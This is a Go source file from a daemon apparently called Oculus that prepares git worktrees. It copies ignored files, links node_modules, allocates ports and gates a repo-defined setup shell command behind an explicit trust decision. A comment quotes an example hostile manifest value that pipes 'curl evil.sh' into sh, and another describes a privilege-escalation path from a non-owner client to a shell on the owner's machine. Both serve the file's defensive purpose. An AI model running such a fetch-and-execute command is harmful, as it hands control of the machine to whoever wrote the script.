package worktree

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"
)

// setupTimeout bounds the per-worktree setup command so a hung install (stdin
// prompt, lock wait, stalled network) can't block the calling goroutine forever.
// Generous enough for real installs (pnpm/npm), but not unbounded.
const setupTimeout = 15 * time.Minute

// Config is an optional per-repo setup manifest at <repoRoot>/.oculus/project.json. It
// bootstraps a fresh worktree past the classic pitfalls: gitignored files (.env,
// node_modules) aren't carried into a worktree, and parallel agents collide on ports.
//
//	{ "setup": "pnpm install", "copy": [".env", ".env.local"],
//	  "portRange": [4000, 4099], "skipHooks": true }
type Config struct {
	Setup     string   `json:"setup"`     // shell command run in the worktree after copy
	Copy      []string `json:"copy"`      // gitignored paths/globs to copy from the repo root
	PortRange []int    `json:"portRange"` // [lo, hi] — a free port is allocated + exported as OCULUS_PORT
	SkipHooks bool     `json:"skipHooks"` // don't run the repo's shared git hooks in this worktree
	// Link SHARES heavy dependency dirs (default: node_modules) by symlinking them from the repo root
	// into the worktree instead of installing/copying a fresh copy per worktree — so N worktrees reuse
	// ONE install. Explicit list wins; when empty, node_modules is auto-linked if it exists at the repo
	// root (set NoAutoLink to opt out). A symlinked dep dir is present before Setup runs, so a `pnpm/npm
	// install` there is a fast no-op/incremental instead of a full download.
	Link       []string `json:"link"`
	NoAutoLink bool     `json:"noAutoLink"`
}

// Result reports what Bootstrap did.
type Result struct {
	Port    int      `json:"port,omitempty"` // 0 = none allocated
	Copied  []string `json:"copied,omitempty"`
	Linked  []string `json:"linked,omitempty"` // dep dirs symlinked from the repo (shared, not reinstalled)
	SetupOK bool     `json:"setup_ok"`
	// SetupCommand is the command the manifest asked for, whether or not it ran. It is reported back
	// so the caller can SHOW it — a trust decision the user can't read is a trust decision they can't
	// make.
	SetupCommand string `json:"setup_command,omitempty"`
	// SetupSkipped/SetupReason record that a setup command existed and deliberately did NOT run.
	// A worktree whose install step was skipped looks exactly like a worktree whose install step
	// failed silently — the caller must be able to say which, in words, or the user is left debugging
	// missing dependencies that were never going to appear.
	SetupSkipped bool   `json:"setup_skipped,omitempty"`
	SetupReason  string `json:"setup_reason,omitempty"`
}

// SetupTrust is the caller's answer to "may this repo's setup command run on this machine?", plus —
// when the answer is no — the sentence the user is going to read.
//
// Bootstrap deliberately does NOT decide this for itself, and there is deliberately no field for it
// on Config. Config is decoded from <repoRoot>/.oculus/project.json, which is an ordinary writable
// file: in this daemon a STEERER (a shared, non-owner client) can create it with fs.write. A trust
// flag that lived on Config could therefore be set by the very party the check exists to stop —
// `{"setup":"curl evil.sh|sh","setupTrusted":true}` would self-approve. Keeping the decision in a
// separate parameter makes that forgery structurally impossible: the only way to say yes is to be
// the code that called Bootstrap.
//
// The zero value is "not allowed", so a caller that forgets to decide fails CLOSED — the worktree is
// still created, the shell command simply doesn't run.
type SetupTrust struct {
	Allowed bool
	Reason  string // why not; shown to the user when Allowed is false
}

// LoadConfig reads <repoRoot>/.oculus/project.json. The bool is false if none exists.
func LoadConfig(repoRoot string) (Config, bool, error) {
	path := filepath.Join(repoRoot, ".oculus", "project.json")
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return Config{}, false, nil
		}
		return Config{}, false, err
	}
	var c Config
	if err := json.Unmarshal(data, &c); err != nil {
		return Config{}, false, fmt.Errorf("%s: %w", path, err)
	}
	return c, true, nil
}

// Bootstrap prepares a freshly-created worktree per cfg: copy gitignored files from the
// repo root, optionally disable shared git hooks, then run the setup command IF trust allows. A
// non-zero port is exported to setup as OCULUS_PORT (allocate it via AllocPort under your own lock
// so concurrent worktrees don't collide).
//
// Everything except the setup command is safe to do unconditionally: copying, symlinking and
// hook-disabling move data around inside a directory the caller already chose. `cfg.Setup` is
// different in kind — it is a string handed to `sh -c` as the daemon's user — so it is the one step
// gated on trust. See SetupTrust for why the decision is a parameter and not a config field.
func Bootstrap(ctx context.Context, repoRoot, worktreePath string, cfg Config, port int, trust SetupTrust) (Result, error) {
	res := Result{Port: port}

	for _, pat := range cfg.Copy {
		matches, err := filepath.Glob(filepath.Join(repoRoot, pat))
		if err != nil {
			return res, fmt.Errorf("copy pattern %q: %w", pat, err)
		}
		for _, src := range matches {
			rel, err := filepath.Rel(repoRoot, src)
			if err != nil {
				continue
			}
			dst := filepath.Join(worktreePath, rel)
			if err := copyPath(src, dst); err != nil {
				return res, fmt.Errorf("copy %s: %w", rel, err)
			}
			res.Copied = append(res.Copied, rel)
		}
	}

	// Share heavy dependency dirs (node_modules, …) by SYMLINKING them from the repo root, so every
	// worktree reuses ONE install instead of downloading a fresh node_modules each time. The link is
	// in place before Setup, so a `pnpm/npm install` in the setup step becomes a fast incremental.
	links := cfg.Link
	if len(links) == 0 && !cfg.NoAutoLink {
		if fi, err := os.Lstat(filepath.Join(repoRoot, "node_modules")); err == nil && fi.IsDir() {
			links = []string{"node_modules"} // smart default: share the repo's node_modules
		}
	}
	for _, rel := range links {
		rel = filepath.Clean(rel)
		src := filepath.Join(repoRoot, rel)
		if _, err := os.Lstat(src); err != nil {
			continue // the repo doesn't have this dir — nothing to share
		}
		dst := filepath.Join(worktreePath, rel)
		if _, err := os.Lstat(dst); err == nil {
			continue // worktree already has it (copied, tracked, or a prior link) — don't clobber
		}
		if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
			return res, fmt.Errorf("link %s: %w", rel, err)
		}
		if err := os.Symlink(src, dst); err != nil {
			return res, fmt.Errorf("link %s: %w", rel, err)
		}
		res.Linked = append(res.Linked, rel)
	}

	if cfg.SkipHooks {
		// Point hooks at a nonexistent dir so the repo's shared hooks don't fire here.
		_ = exec.Command("git", "-C", worktreePath, "config", "core.hooksPath", filepath.Join(worktreePath, ".oculus-nohooks")).Run()
	}

	if cfg.Setup != "" {
		res.SetupCommand = cfg.Setup
		// The one line in this package that runs attacker-reachable input as a shell.
		//
		// THE ATTACK THIS STOPS: <repoRoot>/.oculus/project.json is writable through fs.write, which
		// is a capSteer endpoint — a shared, NON-owner client can create it. session.create with
		// Worktree:true is also capSteer. So without this gate a steerer wrote
		// {"setup":"<anything>"} and then asked for a worktree, and the daemon ran <anything> through
		// `sh -c` as the owner's user, with the owner's keys, tokens and credentials. That is a
		// two-hop escalation from "may prompt the agent" to "has a shell on the owner's Mac", and it
		// bypasses every gate the permission model has, including the capOwner gate on run.test —
		// which exists for exactly this reason and would otherwise have a hole punched straight
		// through it.
		//
		// Do NOT replace this with a check on the file's contents, location, or git status. All of
		// those are things a steerer can produce: they can write the file, and they can get it
		// COMMITTED and even merged into the main checkout through the capSteer worktree PR/merge
		// endpoints, which run `git add -A && git commit` and `git merge` on their behalf. There is
		// no provenance signal on disk that distinguishes a setup command the owner wrote from one
		// that was written for them. The only thing that does is a human decision about the command's
		// actual text — which is what SetupTrust carries.
		if !trust.Allowed {
			res.SetupSkipped = true
			res.SetupReason = trust.Reason
			if res.SetupReason == "" {
				res.SetupReason = "this repo's setup command has not been approved on this machine"
			}
			return res, nil
		}
		if err := RunSetup(ctx, worktreePath, cfg, res.Port); err != nil {
			return res, err
		}
		res.SetupOK = true
	}
	return res, nil
}

// RunSetup executes cfg.Setup in the worktree. It is split out of Bootstrap so a setup command that
// was held back for approval can be run LATER — once the owner says yes — through exactly the same
// path (same timeout, same working directory, same OCULUS_PORT), instead of a second, subtly
// different copy of the same invocation.
//
// It performs NO trust check of its own: every caller must have made the SetupTrust decision first.
func RunSetup(ctx context.Context, worktreePath string, cfg Config, port int) error {
	if cfg.Setup == "" {
		return nil
	}
	ctx, cancel := context.WithTimeout(ctx, setupTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sh", "-c", cfg.Setup)
	cmd.Dir = worktreePath
	cmd.Env = os.Environ()
	if port != 0 {
		cmd.Env = append(cmd.Env, "OCULUS_PORT="+strconv.Itoa(port))
	}
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("setup %q failed: %v: %s", cfg.Setup, err, out)
	}
	return nil
}

// AllocPort returns the first bindable port in [lo,hi] not already in reserved, marking
// it reserved. Call it under a lock so concurrent worktrees get distinct ports.
func AllocPort(lo, hi int, reserved map[int]bool) (int, bool) {
	p, ok := allocPort(lo, hi, reserved)
	if ok && reserved != nil {
		reserved[p] = true
	}
	return p, ok
}

// allocPort returns the first bindable port in [lo,hi] not in reserved.
func allocPort(lo, hi int, reserved map[int]bool) (int, bool) {
	if lo <= 0 || hi < lo {
		return 0, false
	}
	for p := lo; p <= hi; p++ {
		if reserved[p] {
			continue
		}
		ln, err := net.Listen("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(p)))
		if err != nil {
			continue
		}
		_ = ln.Close()
		return p, true
	}
	return 0, false
}

// copyPath copies a file or directory tree from src to dst, creating parents.
// It uses Lstat (not Stat) and recreates symlinks verbatim rather than
// dereferencing them: node_modules trees are symlink farms, often with circular
// links, so following them would blow up the copy size and drive copyDir into
// unbounded recursion.
func copyPath(src, dst string) error {
	fi, err := os.Lstat(src)
	if err != nil {
		return err
	}
	if fi.Mode()&os.ModeSymlink != 0 {
		target, err := os.Readlink(src)
		if err != nil {
			return err
		}
		if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
			return err
		}
		if err := os.Symlink(target, dst); err != nil && !os.IsExist(err) {
			return err
		}
		return nil
	}
	if fi.IsDir() {
		return copyDir(src, dst)
	}
	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}
	return copyFile(src, dst, fi.Mode())
}

func copyDir(src, dst string) error {
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, 0o755); err != nil {
		return err
	}
	for _, e := range entries {
		if err := copyPath(filepath.Join(src, e.Name()), filepath.Join(dst, e.Name())); err != nil {
			return err
		}
	}
	return nil
}

func copyFile(src, dst string, mode os.FileMode) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, mode)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
